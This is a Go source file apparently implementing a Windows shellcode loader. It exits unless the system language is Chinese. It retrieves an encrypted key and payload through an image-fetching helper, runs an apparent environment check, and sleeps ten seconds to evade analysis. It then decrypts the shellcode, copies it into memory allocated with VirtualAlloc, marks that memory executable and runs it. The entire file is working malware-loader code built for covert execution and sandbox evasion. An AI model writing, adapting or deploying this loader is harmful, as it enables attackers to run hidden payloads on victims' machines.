package exp

import (
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"shellcode/root"
	"syscall"
	"time"
	"unsafe"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

func Exp(deskey string, descode string) {
	a, err := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME)
	if err == nil {
		if a[0] != "zh-CN" {
			fmt.Printf("当前不是中文系统")
			os.Exit(1)
		} else {
			key := []byte(root.Getimg(deskey))
			code := root.Getimg(descode)
			root.Check()
			time.Sleep(time.Duration(10) * time.Second) //延时时间
			shellcode, errShellcode := hex.DecodeString(root.Decrypt(code, key))
			if errShellcode != nil {
			}
			//fmt.Println("key:", key, "\ncode:", code)
			kernel32 := windows.NewLazySystemDLL("kernel32.dll")
			ntdll := windows.NewLazySystemDLL("ntdll.dll")
			VirtualAlloc := kernel32.NewProc("VirtualAlloc")
			VirtualProtect := kernel32.NewProc("VirtualProtect")
			RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
			addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
			if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
			}
			_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
			if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
			}
			oldProtect := PAGE_READWRITE
			_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

			if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {

			}
			_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
			if errSyscall != 0 {
			}

		}
	}
}
